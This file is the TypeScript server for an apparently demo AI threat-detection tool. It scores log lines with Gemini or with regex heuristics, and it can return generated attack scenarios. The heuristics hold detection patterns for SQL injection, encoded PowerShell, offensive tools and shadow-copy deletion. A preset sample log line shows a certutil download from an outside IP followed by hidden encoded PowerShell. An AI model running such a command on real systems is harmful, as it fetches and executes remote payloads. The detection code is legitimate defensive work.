import express from 'express';
import { createServer as createViteServer } from 'vite';
import { GoogleGenAI } from '@google/genai';
import dotenv from 'dotenv';
import path from 'path';
import fs from 'fs';

dotenv.config();

const app = express();
const PORT = 3000;

app.use(express.json());

// Initialize GoogleGenAI SDK per system guidelines
let ai: GoogleGenAI | null = null;
if (process.env.GEMINI_API_KEY) {
  ai = new GoogleGenAI({
    apiKey: process.env.GEMINI_API_KEY,
    httpOptions: {
      headers: {
        'User-Agent': 'aistudio-build',
      },
    },
  });
}

// Heuristic fallback generator when AI API is unavailable or offline
function generateFallbackAnalysis(logText: string) {
  const lower = logText.toLowerCase();
  const hasFailedLogins = /(\d+)\s*(failed|invalid)/i.test(lower);
  const hasOffHours = /\b0[0-4]:\d\d/.test(lower);
  const hasNewLocation = /new (country|device|location)|impossible travel/i.test(lower);
  const hasObfuscation = /base64|powershell\s+-enc|(%[0-9a-f]{2}.*){3}/i.test(lower);
  const hasInjection = /('|%27)\s*or\s*1=1|union\s+select|<script/i.test(lower);
  const hasLargeData = /(\d+(\.\d+)?)\s*(gb|mb)/i.test(lower) && (lower.includes('gb') || lower.includes('export') || lower.includes('exfiltrat'));
  const hasPrivilege = /sudo|role granted|privilege|privilege escalation|runas/i.test(lower);
  const hasTooling = /nmap|mimikatz|sqlmap|metasploit|cobalt strike|wireshark/i.test(lower);
  const hasRansomware = /encrypt|ransom|\.locked|\.crypto|vssadmin delete shadows/i.test(lower);

  let score = 5;
  const mitre: Array<{ tactic: string; technique: string; id: string }> = [];
  const iocs: string[] = [];

  if (hasFailedLogins) {
    score += 30;
    mitre.push({ tactic: 'Credential Access', technique: 'Brute Force / Password Guessing', id: 'T1110' });
    iocs.push('High frequency authentication failure threshold exceeded');
  }
  if (hasOffHours) {
    score += 15;
    mitre.push({ tactic: 'Execution', technique: 'Scheduled or Off-Hours Execution', id: 'T1053' });
    iocs.push('Anomalous temporal baseline: active between 00:00 - 04:59 UTC');
  }
  if (hasNewLocation) {
    score += 20;
    mitre.push({ tactic: 'Initial Access', technique: 'Valid Accounts: Geolocation Deviation', id: 'T1078' });
    iocs.push('New IP geocoding mismatch (Impossible Travel velocity)');
  }
  if (hasObfuscation) {
    score += 25;
    mitre.push({ tactic: 'Defense Evasion', technique: 'Obfuscated Files or Information', id: 'T1027' });
    iocs.push('Encoded command-line invocation detected (Base64 / UTF-16LE)');
  }
  if (hasInjection) {
    score += 35;
    mitre.push({ tactic: 'Initial Access', technique: 'Exploit Public-Facing Application: SQLi', id: 'T1190' });
    iocs.push('SQL token manipulation payload in HTTP parameters');
  }
  if (hasLargeData) {
    score += 25;
    mitre.push({ tactic: 'Exfiltration', technique: 'Exfiltration Over Web Service / Cloud Storage', id: 'T1567' });
    iocs.push('Abnormal outbound egress volume spike beyond user baseline');
  }
  if (hasPrivilege) {
    score += 20;
    mitre.push({ tactic: 'Privilege Escalation', technique: 'Sudo and SUID Escalation', id: 'T1548' });
    iocs.push('Elevation of privilege event without change-management ticket');
  }
  if (hasTooling) {
    score += 30;
    mitre.push({ tactic: 'Discovery / Lateral Movement', technique: 'Network Service Discovery & Post-Exploitation Tooling', id: 'T1046' });
    iocs.push('Offensive security toolkit signature or string artifact matched');
  }
  if (hasRansomware) {
    score += 45;
    mitre.push({ tactic: 'Impact', technique: 'Data Encrypted for Impact', id: 'T1486' });
    iocs.push('Mass file system entropy increase and shadow copy deletion attempt');
  }

  score = Math.min(100, Math.max(score, 5));

  let severity = 'NORMAL';
  if (score >= 70) severity = 'CRITICAL_ZERO_DAY';
  else if (score >= 45) severity = 'HIGH';
  else if (score >= 25) severity = 'SUSPICIOUS';

  return {
    anomalyConfidence: score,
    severity,
    threatCategory: score > 60 ? 'Multi-Vector Novel Anomaly' : score > 25 ? 'Suspicious Entity Activity' : 'Benign Standard Operation',
    traditionalDetectionVerdict: score > 40
      ? 'BLIND SPOT: Traditional static antivirus and signature matching (e.g. Snort/Suricata static strings) missed this event because the attacker modified variable names, encoded commands, or leveraged living-off-the-land legitimate binaries.'
      : 'No known signature detected; classified as standard traffic.',
    aiBehavioralVerdict: score > 40
      ? `AI behavioral model identified an anomalous risk profile (Score ${score}/100). The entity deviates heavily from baseline access hours, payload entropy, and operational privileges.`
      : 'Behavioral profiling matches established historical norms. Low residual risk score.',
    mitreAttacks: mitre.length > 0 ? mitre : [{ tactic: 'Normal Operation', technique: 'Standard User Interaction', id: 'T0000' }],
    recommendedPlaybook: score > 40
      ? [
          'Immediate Host Isolation: Disconnect infected host from corporate VLAN',
          'Token Revocation: Invalidate active OAuth and Kerberos session tokens for involved user',
          'Threat Hunting: Query SIEM for similar payloads across adjacent endpoints',
          'Automated Firewall Rule: Blacklist ingress/egress IP on edge security group',
        ]
      : ['Log event for baseline telemetry auditing', 'No corrective action required'],
    indicatorsOfCompromise: iocs.length > 0 ? iocs : ['Standard benign network handshake'],
    executionTimeMs: 14,
    source: 'Local Behavioral Heuristic Engine',
  };
}

// POST: Real-Time AI Threat Analysis
app.post('/api/analyze-threat', async (req, res) => {
  const { logText, metadata } = req.body;

  if (!logText || typeof logText !== 'string') {
    return res.status(400).json({ error: 'logText is required.' });
  }

  const startTime = Date.now();

  if (ai) {
    try {
      const prompt = `You are AegisAI, an elite cyber defense AI anomaly and threat detection engine.
Analyze the following cybersecurity log line, telemetry event, or suspicious activity:

EVENT LOG:
"""${logText}"""

ADDITIONAL METADATA:
${JSON.stringify(metadata || {})}

Evaluate whether this represents a benign event, a known attack, or an evasive/novel/zero-day threat designed to bypass traditional signature systems (e.g. polymorphic scripts, living-off-the-land binaries, credential misuse, abnormal data staging).

Return valid JSON strictly adhering to this format:
{
  "anomalyConfidence": <number 0-100>,
  "severity": <"NORMAL" | "SUSPICIOUS" | "HIGH" | "CRITICAL_ZERO_DAY">,
  "threatCategory": "<string short classification, e.g. Polymorphic PowerShell Exfiltration, Sudo Privilege Abuse, Zero-Day Injection, Benign Admin Routine>",
  "traditionalDetectionVerdict": "<Why traditional signature-based systems fail or pass this, e.g. explaining hash reliance or regex evasion>",
  "aiBehavioralVerdict": "<Detailed analysis of intent, sequence, anomalies, entropy, and risk context>",
  "mitreAttacks": [
    { "tactic": "<MITRE Tactic name>", "technique": "<Technique name>", "id": "<e.g. T1059.001>" }
  ],
  "recommendedPlaybook": [
    "<Action 1>",
    "<Action 2>",
    "<Action 3>"
  ],
  "indicatorsOfCompromise": [
    "<IOC 1>",
    "<IOC 2>"
  ]
}`;

      const response = await ai.models.generateContent({
        model: 'gemini-3.8-flash',
        contents: prompt,
        config: {
          responseMimeType: 'application/json',
          temperature: 0.2,
        },
      });

      const responseText = response.text?.trim() || '{}';
      const parsed = JSON.parse(responseText);
      const executionTimeMs = Date.now() - startTime;

      return res.json({
        ...parsed,
        executionTimeMs,
        source: 'Gemini 3.8 Flash Threat Neural Model',
      });
    } catch (err: any) {
      console.warn('Gemini API call failed or timed out, using fallback behavioral analyzer:', err?.message || err);
      const fallback = generateFallbackAnalysis(logText);
      return res.json({
        ...fallback,
        executionTimeMs: Date.now() - startTime,
        warning: 'Analyzed via integrated offline behavioral engine.',
      });
    }
  }

  // Fallback if no API key configured
  const fallback = generateFallbackAnalysis(logText);
  return res.json({
    ...fallback,
    executionTimeMs: Date.now() - startTime,
  });
});

// POST: Generate Novel Attack Scenario for Testing
app.post('/api/generate-scenario', async (req, res) => {
  const { attackType } = req.body;
  const scenarioType = attackType || 'Zero-Day Living-Off-The-Land Attack';

  if (ai) {
    try {
      const prompt = `Generate a realistic single-line or multi-field log event representing a modern sophisticated cyber attack of type "${scenarioType}" that tries to evade traditional signature detection. Also include a brief 1-sentence title and explanation of how it evades static antivirus.
Return valid JSON:
{
  "title": "<Short title>",
  "logLine": "<The realistic raw log event with timestamps, user, command or payload>",
  "evasionReason": "<How it bypasses traditional static signatures>"
}`;

      const response = await ai.models.generateContent({
        model: 'gemini-3.8-flash',
        contents: prompt,
        config: {
          responseMimeType: 'application/json',
          temperature: 0.7,
        },
      });

      const parsed = JSON.parse(response.text?.trim() || '{}');
      return res.json(parsed);
    } catch (err) {
      // Fallback preset
      return res.json({
        title: 'Polymorphic Exfiltration via CertUtil & DNS Tunneling',
        logLine: '03:12:44 host=prod-db-01 user=svc_backup certutil -urlcache -split -f http://194.26.29.112/update.bin c:\\temp\\sys.dat && powershell -nop -w hidden -enc JABjAGwAaQBlAG4AdAAgAD0AIABuAGUAdwAtAG8AYgBqAGUAYwB0AA==',
        evasionReason: 'Uses trusted built-in Windows utility (Living-off-the-Land binary CertUtil) and randomized base64 chunking to bypass static file hash scanning.',
      });
    }
  }

  return res.json({
    title: 'Polymorphic Exfiltration via CertUtil & DNS Tunneling',
    logLine: '03:12:44 host=prod-db-01 user=svc_backup certutil -urlcache -split -f http://194.26.29.112/update.bin c:\\temp\\sys.dat && powershell -nop -w hidden -enc JABjAGwAaQBlAG4AdAAgAD0AIABuAGUAdwAtAG8AYgBqAGUAYwB0AA==',
    evasionReason: 'Uses trusted built-in Windows utility (Living-off-the-Land binary CertUtil) and randomized base64 chunking to bypass static file hash scanning.',
  });
});

// Setup Vite middleware in dev or static serving in production
async function startServer() {
  const isProduction = process.env.NODE_ENV === 'production';

  if (!isProduction) {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: 'spa',
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.resolve(__dirname, 'dist');
    if (fs.existsSync(distPath)) {
      app.use(express.static(distPath));
      app.get('*', (_req, res) => {
        res.sendFile(path.join(distPath, 'index.html'));
      });
    }
  }

  app.listen(PORT, '0.0.0.0', () => {
    console.log(`AegisAI Security Monitoring Server listening on http://0.0.0.0:${PORT}`);
  });
}

startServer();
